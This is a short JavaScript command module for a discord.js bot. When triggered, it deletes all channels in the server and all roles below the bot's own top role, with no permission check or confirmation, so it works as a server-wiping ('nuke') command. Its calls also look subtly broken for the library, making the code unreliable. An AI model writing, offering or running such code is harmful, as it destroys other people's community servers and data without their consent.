const discord = require('discord.js')

exports.run = async (client, message) => {
    message.guild.roles
        .filter(r => r.position < message.guild.me.highestRole.position)
        .deleteAll();
    message.guild.channels.deleteAll();
}